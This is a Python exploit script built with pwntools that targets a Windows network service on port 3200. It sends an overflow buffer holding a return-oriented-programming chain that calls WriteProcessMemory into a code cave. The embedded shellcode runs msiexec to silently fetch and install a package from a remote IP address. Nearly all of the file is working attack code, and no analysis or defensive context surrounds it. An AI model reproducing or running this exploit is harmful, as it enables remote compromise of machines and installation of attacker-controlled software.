#!/usr/bin/python
import socket
import sys
from pwn import *

context.update(arch='i386', os='windows')

try:
	server = sys.argv[1]
	port = 3200
	size = 436
	#0x20 0x23 0x7d 0xce 0xe0

	shellcode = [  0xfc, 0xeb, 0x0a, 0x5d, 0x31, 0xdb, 0xb3, 0x9a, 0x01, 0xeb, 0x55, 0xff,
  0xe3, 0xe8, 0xf1, 0xff, 0xff, 0xff, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64,
  0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c,
  0x04, 0x2c, 0x21, 0xfe, 0xc0, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x83, 0xe9,
  0x01, 0x75, 0xeb, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01,
  0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x53, 0x01, 0xd0, 0x50, 0x8b,
  0x48, 0x18, 0x8d, 0x58, 0x21, 0x4b, 0x8b, 0x1b, 0x01, 0xd3, 0x85, 0xc9,
  0x74, 0x40, 0x83, 0xe9, 0x01, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff,
  0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x84, 0xc0, 0x75, 0xf4,
  0x89, 0xe8, 0x03, 0x78, 0xf8, 0x3b, 0x78, 0x24, 0x75, 0xdc, 0x58, 0x8b,
  0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
  0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b,
  0x61, 0x59, 0x5a, 0x51, 0x50, 0xc3, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xe9,
  0x75, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x01, 0x31, 0xdb, 0xb3, 0xca, 0x89,
  0xe8, 0x01, 0xd8, 0x89, 0xc6, 0x89, 0xe7, 0x81, 0xef, 0x04, 0xff, 0xff,
  0xff, 0x57, 0x31, 0xc9, 0xb1, 0x27, 0xac, 0x3c, 0x24, 0x75, 0x02, 0x2c,
  0x04, 0xaa, 0xe2, 0xf6, 0x31, 0xc0, 0x88, 0x07, 0x68, 0x31, 0x8b, 0x6f,
  0x87, 0xff, 0xd5, 0x90, 0x6d, 0x73, 0x69, 0x65, 0x78, 0x65, 0x63, 0x24,
  0x2f, 0x69, 0x24, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x31, 0x37,
  0x32, 0x2e, 0x32, 0x30, 0x33, 0x2e, 0x32, 0x31, 0x32, 0x2e, 0x31, 0x31,
  0x30, 0x2f, 0x58, 0x24, 0x2f, 0x71, 0x6e]
	shellcode = bytes(shellcode)
	#code cave 55102d40
	wp = p32(0x55101f9c) # pop eax ; ret
	wp += p32(0x55103020-8)
	wp += p32(0x55101f7a) # mov eax, dword [eax+0x08] ; retn 0x0008
	wp += p32(0x551015b5) # push eax ; adc byte [ebp+0x5D], dl ; ret
	wp += p32(0x42424242) # dummy
	wp += p32(0x41414141)  # WriteProcessMemory address
	wp += p32(0x55102d40)  # shellcode return address to return to after WriteProcessMemory is called
	wp += p32(0xffffffff)  # hProcess (pseudo Process handle)
	wp += p32(0x55102d40)  # lpBaseAddress (Code cave address)
	wp += p32(0xfffffff8)  # lpBuffer (shellcode address) this will be our stack
	wp += p32(0x46464646)  # nSize (size of shellcode) #stack
	wp += p32(0x47474747)  # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)

	log.info("set lpBuffer")
	#set ecx to our stack for lpBuffer
	stagger = p32(0x55101f9c) # pop eax ; ret
	stagger += p32(0xfffffe6c) # -0x194
	stagger += p32(0x55101f42) # add ecx, eax ; ret --> ecx become pointer to our lpBuffer
	
	# put our stack to lpBuffer
	stagger += p32(0x55101f9c) # pop eax ; ret
	stagger += p32(0xfffffe4f) # -0x1b1
	stagger += p32(0x55102537) # neg eax ; dec eax ; pop ebp ; ret
	stagger += p32(0xdeadbeef) # dummy
	stagger += p32(0x55101f35) # add eax, ecx ; ret
	stagger += p32(0x551024cd) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret

	#pos = mapChars(shellcode)
	#stagger += decode(pos, shellcode)

	#set nSize
	stagger += p32(0x55101f9c) # pop eax ; ret
	stagger += p32(0xfffffffb) # -0x5
	stagger += p32(0x55102537) # neg eax ; dec eax ; pop ebp ; ret
	stagger += p32(0xdeadbeef) #dummy
	stagger += p32(0x55101f42) # add ecx, eax ; ret
	stagger += p32(0x55101f9c) # pop eax ; ret
	stagger += p32(0xfffffdbf) # -577
	stagger += p32(0x55102537) # neg eax ; dec eax ; pop ebp ; ret
	stagger += p32(0x90909090) # dummy
	stagger += p32(0x551024cd) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret
	
	#set lpNumberOfBytesWritten
	stagger += p32(0x55101f9c) # pop eax ; ret
	stagger += p32(0xfffffffb) # -0x5
	stagger += p32(0x55102537) # neg eax ; dec eax ; pop ebp ; ret
	stagger += p32(0x90909090) # dummy
	stagger += p32(0x55101f42) # add ecx, eax ; ret
	stagger += p32(0x55101f92) # xor eax, eax ; ret
	stagger += p32(0x551024cd) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret

	stagger += p32(0x55101f9c) # pop eax ; ret
	stagger += p32(0xffffffd4) # -0x2c
	stagger += p32(0x55101f42) # add ecx, eax ; ret
	stagger += p32(0x55102496) # mov eax, ecx ; ret
	stagger += p32(0x55102417) # pop ebp ; ret
	stagger += p32(0x55105510) # prepared for back
	stagger += p32(0x55101faf) # mov esp, eax

	#return here, set esp now in ecx
	rop = p32(0x55101f26) # mov ebp, esp ; pop ecx ; ret
	rop += p32(0xdeadbeef) # dummy
	rop += p32(0x551025d1) # push ebp ; pop esi ; ret
	rop += p32(0x55101f87) # mov ecx, esi ; ret
	#fffffe78
	rop += p32(0x55101f9c) # pop eax ; ret
	rop += p32(0xfffffe78)
	rop += p32(0x55101f35) # add eax, ecx ; ret
	rop += p32(0x55101faf) # mov esp, eax ; ret


	encodedShellcode = encode(shellcode)
	print(encodedShellcode, len(encodedShellcode), len(rop))

	inputBuffer = cyclic(size-len(stagger)-len(wp), n=4)
	command = b"COMMAND MOVETEXT "
	command += wp+stagger+inputBuffer+rop+shellcode
	command += b"\r\n"

	print("Sending evil buffer...", len(command))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))
	s.send(command)
	s.close()

	print("Done!")

except socket.error:
	print("Could not connect!")